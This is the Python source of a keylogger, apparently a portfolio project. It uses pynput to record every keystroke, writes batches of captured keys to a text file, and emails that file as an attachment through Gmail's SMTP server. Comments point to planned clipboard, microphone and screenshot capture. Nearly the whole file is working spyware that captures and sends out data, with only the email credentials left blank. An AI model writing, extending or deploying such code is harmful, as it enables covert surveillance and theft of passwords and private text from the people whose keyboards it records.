# ===============================================================
# LIBRARY IMPORT |
# ================

# Run this line in the console to install the pynput module to gain access to the keyboard interface:
# "py -m pip install pynput"
from pynput import keyboard

# Email system funtionality import.
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# Collecting computer information library import.
import socket
import platform

# Clipboard functionality import.
# import win32clipboard

# Used to track internal time.
import time

# Microphone functionality.
# from scipy.io.wavfile import write
# import sounddevice as sd

# File encryption functionality.
# from cryptography.fernet import Fernet 

# Getpass library to capture username.
import getpass

# Requests libary to get system information.
# from requests import get

# Screenshot functionality, using multiprocessing freeze support to capture one screenshot at a time.
from multiprocessing import Process, freeze_support
# from PIL import ImageGrab

# Operating System
import os

# datetime import
from datetime import datetime

# ===============================================================
# VARIABLES |
# ===========

# --- Key Capture ---

# Text file.
keyFile = "keyfile.txt"

# Text file location.
filePath = "E:\\Portfolio\\Keylogger\\Keylogger-Git"
extend = "\\"

# List to hold keys - Testing Purposes.
# keysList = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']

# List to hold keys.
keysList = []

# Counts how many keys need to be stored before the list is written.
count = 0

# --- Email Authentication ---

# Authentication capture variables removed before uploading to github.

# Email address of the sender.
email_from = os.environ.get('')

# Email password, secured via Windows 11 enviromental variables settings.
authenticated_password = os.environ.get('')

# Email address of the reciever.
email_to = os.environ.get('')

# Email subject line.
email_subject = "Keylogger - [Subject not captured]"

# ===============================================================
# SCRIPT START |
# ==============

# ---------------------------------------------------------------
# Records key presses as they happen.
def keyPressed(key):

    # Exits script is escape key pressed.
    if key == keyboard.Key.esc:

        print("Terminating Script")
        return False

    try:

        # Adds a key press to the list.
        keysList.append(key)

        # Monitors the length of the list.
        count = len(keysList)

        # If the length of the list goes over a certain value, the list is stored into file and the current working list is wiped clear.
        if count > 50:

            # Cleans the list.
            keyCleaning(keysList)
            count = 0
            keysList.clear()

            # Adds computer information to the file.


            # Sends off the information via email.
            sendEmail(keyFile, filePath + extend + keyFile, email_from)

    except:
            
        # Prints error message.
        print("ERROR: Unable to capture key.")

# ---------------------------------------------------------------
# Writes the string of keys to the file.
def writeToFile(keysList):

    # Don't forget to declare your local variables.. again.
    keyString = ""
    timestamp = datetime.now()
    title = "Captured Keys - {}\n\n".format(timestamp)

    try:

        # Opens up a file called "keyfile.txt and the 'a' flag means to append to the file, if no file of this name exists one is automatically created.
        with open(filePath + extend + keyFile, 'a') as logKey:

            logKey.write(title)

            # List comprehension.
            keyString = "".join([str(key).replace("'", "") for key in keysList])

            # Writes the string to the file.
            logKey.write(keyString)
            logKey.write("\n\n========================================\n\n")
            print("Keys Saved")

    except:

        #
        print("ERROR: Couldn't write to file.")

    return

# ---------------------------------------------------------------
# Takes in the raw key list and cleans up the keys captured before moving them to the writeToFile function as a string for saving to a file.
def keyCleaning(keysList):

    try:

        # Cleaning list.
        for index, key in enumerate(keysList):

            # CHECK 01: spaces
            if key == keyboard.Key.space:

                # Takes the current element by its index and changes it, the index was captured in the enumerate clause.
                keysList[index] = " "

        # Write cleaned list to file.
        print("Keys Cleaned")
        writeToFile(keysList)

    except:

        #
        print("ERROR: Couldn't clean list.")

    return

# ---------------------------------------------------------------
def sendEmail(fileName, pathToFile, destination):
    
    #
    print("email function start")

    # Incorporated email address.
    address = destination

    # Allows the formatting of email messages to support a wider range of formats, such as video, image, audio, character texts, email attachments etc.
    message = MIMEMultipart()

    # Creates a unique subject line
    #email_subject = datetime.now()

    # 
    message['From'] = address
    message['To'] = email_to
    message['Subject'] = email_subject

    # Email body.
    body = "Email Body"

    # Enters the "Email body" defined above to the email.
    message.attach(MIMEText(body, 'plain'))

    # Grabs the file.
    filename = fileName

    # Attachment creation, opens the attachment and reads it in binary, hence 'rb'
    attachment = open(pathToFile, 'rb')

    # New instance of MIMEBase, named base.
    base = MIMEBase('application', 'octet-stream')

    # Changes the payload into an encoded form.
    base.set_payload((attachment).read())

    # Encodes into base64.
    encoders.encode_base64(base)

    # Creates the header.
    base.add_header('Content-Disposition', "attachment: filename = %s" % filename)

    # Attaches the instance of base to the instance of message.
    message.attach(base)

    # --- Creating SMTP session ---

    # 587 is the port number for gmail.
    mail = smtplib.SMTP('smtp.gmail.com', 587)

    # Secured via TLS.
    mail.starttls()

    # Login process.
    mail.login(email_from, authenticated_password) # <--- Stops here.

    # Converting the message into a simple string.
    mailText = message.as_string()

    # Sends the email.
    mail.sendmail(email_from, email_to, mailText)

    # Session termination.
    mail.quit()

    #
    print("email sent")

# ---------------------------------------------------------------
# Starts the script.
def main():

    # TESTING for terminal functionality.
    print("Starting Script")

    # The listener object, the "on_press" method passes the keyboard inputs to the method keyPressed via its "key" parameter.
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

# Defines main method that launches when the script runs.
# If the "main" method is ready to fire, do the following.
if __name__ == "__main__":

    main()

